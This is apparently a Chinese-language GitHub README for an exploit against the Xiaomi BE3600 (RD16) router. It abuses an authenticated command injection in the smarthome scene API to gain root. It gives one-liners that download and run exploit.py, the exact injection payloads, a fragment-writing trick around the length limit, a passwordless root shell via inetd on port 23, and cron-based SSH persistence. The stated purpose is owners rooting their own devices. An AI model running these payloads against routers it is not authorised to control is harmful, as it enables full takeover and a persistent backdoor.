# Xiaomi BE3600 (RD16) — SmartHome Scene 命令注入 → Root Shell / SSH

> 已验证设备：**Xiaomi BE3600 路由器（内部型号 RD16，中国版）**
> 已验证固件：**MIUI ROM 1.0.41 release**（2025-04-01 构建，Qualcomm IPQ5312 / ARMv7 / OpenWrt 18.06 / busybox 1.36.1）
> 漏洞类型：**认证后命令注入**（需要 Web 管理密码）
> 影响：拿到 root shell 并可持久化 SSH
>
> English: [README.en.md](README.en.md)

## 主要路径

```
Web 管理密码
    │
    ▼
POST api/xqsystem/login ────────────────────────────► 拿到 stok token
    │
    ▼
POST api/xqsmarthome/request_smartcontroller
  scene_setting：wan_block action 的 mac 字段含 \n
    │   smartcontroller 把 mac 未转义地拼进
    │   system("/usr/sbin/sysapi macfilter set mac=%s wan=%s;... commit")
    ▼
scene_start ──► 注入命令以 root 执行（≤18 字符/条）
    │
    ▼
追加式碎片写入（echo -n FF>>/tmp/x + cat /tmp/0>>/tmp/x）
    │   每条注入命令 ≤18 字符，脚本长度不设上限
    ▼
inetd.conf + /usr/sbin/inetd ──► :23 临时免密 root /bin/sh（调试用）
    │
    ▼
/data + /etc/crontabs（sec_cfg）──► 看门狗每分钟自愈
dropbear -s + authorized_keys ────► :22 SSH（仅密钥）
persist 公钥登录验证通过后 ──► 移除 inetd 与临时 shell
```

- **认证后 RCE**：需要 Web 管理密码换 `stok` token 才能到达注入接口，不是未授权 RCE
- XMiR-Patcher 的历史注入点（`start_binding` 等）在 1.0.41 已全部修复；这条 `wan_block` 通道是目前唯一实测可用的注入面
- `/etc` 是 ramfs（重启全清），持久化只能落在 `/data`（UBIFS）与 `/etc/crontabs`（sec_cfg ext4）上
- `:23` 免密 shell 只做调试通道；`persist` 阶段在确认 SSH 可用后会关闭 inetd，看门狗只负责恢复 dropbear

## 实测约束

| 约束 | 说明 |
|---|---|
| 命令长度 | 每条注入命令 ≤18 字符（fortify snprintf 边界，超限 daemon 崩溃） |
| 禁用字符 | `' " ; | $ &` 反引号 `\`；`\n` 经 JSON 双层转义可注入真换行 |
| 场景结构 | 每场景只放 1 个 action（多 action 会崩 daemon） |
| 长驻进程 | `system()` 等待管道 EOF——inetd/dropbear 这类 daemon 要先写文件或交给 procd，直接跑会卡死调用方 |
| 数字结尾碎片 | `echo -n ..D>/tmp/N`（D 为数字）被解析成 `D>` fd 重定向、文件写空——需在 `>` 前补空格（`..D >/tmp/N`） |
| 可写区域 | `/etc` ramfs 重启全清；`/data`、`/etc/crontabs`（sec_cfg）、`/etc/config` 持久 |

## 懒人命令（免克隆，全自动）

macOS / Linux（需 `python3` + `curl`）：

```bash
curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist --pubkey 'ssh-rsa AAAA...你的公钥'
```

Windows PowerShell（`python` 不存在就把命令里的 `python` 换成 `py`）：

```powershell
irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist --pubkey 'ssh-rsa AAAA...你的公钥'
```

- `--stage persist` = 全自动：注入 → 临时 inetd（:23）→ 写入密钥 + dropbear（:22，`-s` 仅密钥）→ **真实 SSH 登录验证通过**后移除 inetd → `/data` + cron 看门狗自愈
- `--pubkey` **必填**：SSH 只做密钥认证，密码登录整路关闭（不再有 `-B` 空密码）
- 追加 `--privkey 私钥路径` 用本机 `ssh` 做一次真实登录验证；不给则改为人工确认后才关 :23
- 追加 `--allow-cidr 192.168.31.0/24` 走独立链 `RD16_SSH`（跳转规则置顶），把 :22 限到该网段
- `--password` 不传会交互式询问，密码不进 shell 历史和进程列表
- 只要临时调试 shell：`--stage persist` 换成 `--stage shell`，完成后 `nc 192.168.31.1 23`（重启即消失，不写持久配置）

## 快速复现（exploit.py）

```bash
git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh

python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage shell
# 之后: nc <路由器IP> 23  →  root /bin/sh（临时调试用）

python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage persist \
    --pubkey 'ssh-rsa AAAA...你的公钥'
# SSH（:22，仅密钥）重启不掉；:23 临时 shell 验证后自动移除
```

exploit.py 只用标准库，完成登录→注入→inetd→(可选)持久化全过程。

## 原理（追加式碎片写入）

注入命令 ≤18 字符，脚本按 ≤2 字符碎片**直接追加**进目标文件，整条路径上不存在超过 18 字符的组装命令，因此脚本长度不设上限：

```sh
rm -f /tmp/x
echo -n FF>>/tmp/x    # 非空格碎片（≤2 字符）直接追加
echo -n A B>/tmp/0    # 含空格的三字符组 -> 临时文件
cat /tmp/0>>/tmp/x    #   再追加（空格靠 argv 拆分产生）
echo -n D >>/tmp/x    # 纯数字碎片要 ' >>'，否则 'D>>' 被当 fd 重定向
echo A D >>/tmp/x     # 行尾碎片用普通 echo 顺带补换行
sh /tmp/x
```

- 文件名不再受单字符名额限制：只有一个 `/tmp/0` 反复使用，一个输出文件承接全部内容
- 行中出现的 `空格+数字`（`x 2` 形）无法合法写出，写入器会明确报错；`>` 这类重定向字符进不了脚本内容
- `run_cmd()` 对每条注入命令做硬性长度与禁用字符检查，超长/越界直接拒绝而非静默失败

## 完整实现方式

下面是不依赖工具的完整手工路径（与 exploit.py 等价），每一步都可单独验证。

### 0. 前提

- 电脑与路由器同一局域网，能访问 `http://<AP_IP>/cgi-bin/luci`
- 知道 Web 管理密码

### 1. 登录拿 token

```bash
TOK=$(curl -s -X POST 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/login' \
    --data-urlencode 'username=admin' \
    --data-urlencode 'password=你的密码' \
    --data-urlencode 'logtype=2' \
    | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "$TOK"
```

> 密码要逐字段 `--data-urlencode`（`&`、`+` 等字符必须编码）；不要把整串 body 塞进一个 `--data-urlencode`，那会把 `&` 编码进参数名。

### 2. 命令执行通道：scene + wan_block

```bash
# 建场景（action_list 只放 1 个 action）
curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_setting","id":0,"name":"x","launch":{"mode":"home"},"action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,"payload":"{\"command\": \"wan_block\", \"mac\": \"AA\nid>/tmp/messages\n\"}"}]}'
# → {"code":0,"id":<sid>}

# 触发
curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_start","id":<sid>}'
```

`mac` 字段为 `AA\n<CMD>\n`，注入的命令与 `macfilter commit` 换行隔开并行执行。

### 3. 执行结果读回

`/tmp/messages` 会进 syslog 打包文件。先让 daemon 把文件内容 cp 过去，再下载：

```bash
# 让 daemon 执行 cp（把任意文件拷进 /tmp/messages）
# mac=AA\ncp /tmp/x /tmp/messages\n  （同样走 scene 通道）

# 拿打包文件
F=$(curl -s "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/sys_log" \
    | grep -o '"file":"[^"]*"' | cut -d'"' -f4)
curl -s -o sl.tar.gz \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/c_download/$F"
tar -xzf sl.tar.gz -C sl && head sl/tmp/messages
```

打包里还有 `stat/system-02-ps.txt`、`stat/hardware-01-bdata.txt`、`stat/firewall-01-iptable.txt` 等，直接看进程/nvram/iptables。

### 4. 写长脚本（追加碎片法）

18 字符内塞不下整段脚本，把内容切片**逐片追加**（每次注入一条）：

```sh
rm -f /tmp/x                            # 清空目标
echo -n cp>>/tmp/x                      # ≤2 字符碎片直接追加
echo -n A B>/tmp/0                      # 含空格的三字符组 -> 临时文件
cat /tmp/0>>/tmp/x                      #   再追加（空格靠 argv 拆分产生）
echo -n D >>/tmp/x                      # 纯数字碎片必须 ' >>'
sh /tmp/x                               # 执行
```

空格碎片：`echo -n A B>/tmp/0`（文件得 `"A B"`，`A` 与 `B` 各一个非数字字符），随后 `cat /tmp/0>>/tmp/x`。
全部注入命令都 ≤18 字符，脚本长度无上限。

### 5. 拿临时 shell：inetd（调试用）

裸 `telnetd` 会因 `nvram get telnet_en`/`bdata get telnet_en` 检查秒退；`set_telnet` 又被 `apps.telnet` 特性开关挡住。改用 inetd（不检查该项）：

```sh
# 脚本内容（碎片法写入）
cp /tmp/ii /etc/inetd.conf
inetd
```

`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`（inetd 自 daemonize，不卡调用方）。之后 `nc <ip> 23` → 免密 root shell。**它只当调试通道——重启即消失，也不要写进持久化；第 7 步确认 SSH 可用后要关掉它。**

### 6. SSH：仅密钥的 dropbear

```sh
# /etc/dropbear/dropbear_rsa_host_key 是 0 字节占位文件，必须先删
rm /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /data/dropbear_rsa_host_key     # ~1min，生成到 /data（持久）
echo '你的 ssh-rsa 公钥' > /data/authorized_keys    # 先放 /data（重启不掉）
mkdir -p /etc/dropbear
cp /data/authorized_keys /etc/dropbear/authorized_keys
/usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key  # -s 禁用密码登录，仅密钥
```

`ssh -i 私钥 root@<ip>` 即通。**不要加 `-B`**（允许空密码登录是事故源）；如果确实要密码登录，root 密码哈希得用 `$1$` md5（此固件 musl 不支持 `$6$` sha512）。

### 7. 持久化（看门狗只管 dropbear）

`/etc` 是 ramfs，重启回 squashfs 初始态——但 `/data`（UBIFS）与 `/etc/crontabs`（sec_cfg ext4）持久。写 `/data/persist.sh`：

```sh
#!/bin/sh
mkdir -p /etc/dropbear
cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
pgrep -x dropbear >/dev/null 2>&1 || \
    /usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key
```

`/etc/crontabs/root` 加一行（该文件在 sec_cfg 上，重启不掉）：

```
* * * * * sh /data/persist.sh >/dev/null 2>&1
```

收尾：先用真实私钥确认能登录（`ssh -i 私钥 root@<ip> id` 返回 `uid=0`），**确认通过后**再关掉调试 shell——只看 :22 监听或 banner 不算数：

```sh
for p in $(pgrep -x inetd); do kill $p; done
rm -f /etc/inetd.conf
```

可选：把 SSH 限到管理网段（独立链 + 置顶跳转，规则顺序不受既有 ACCEPT 影响；写进 persist.sh 一起自愈）：

```sh
iptables -N RD16_SSH 2>/dev/null
iptables -F RD16_SSH
iptables -A RD16_SSH -s 192.168.31.0/24 -j ACCEPT
iptables -A RD16_SSH -j DROP
iptables -I INPUT -p tcp --dport 22 -j RD16_SSH
```

重启后 ~1 分钟 dropbear 自动恢复，而 inetd 不会回来。

## 涉及文件

- `exploit.py` — 单文件工具（stdlib only），完成登录→注入→inetd→(可选)持久化
- `tests/test_exploit.py` — 离线单元测试（stdlib only），碎片写入回放、长度/禁用字符、输入校验
- `docs/TECHNICAL.md` — 注入点源码定位、限制推导、备选通道（中文）
- `docs/TECHNICAL_EN.md` — 上述技术细节的英文版
- `README.en.md` — 英文版说明

## 免责声明

仅用于你自己拥有/被授权的设备。这是一个**认证后**漏洞（需管理密码），不属于未授权 RCE；如果你发现同接口的未授权绕过，请走厂商协调披露渠道。

## License

MIT
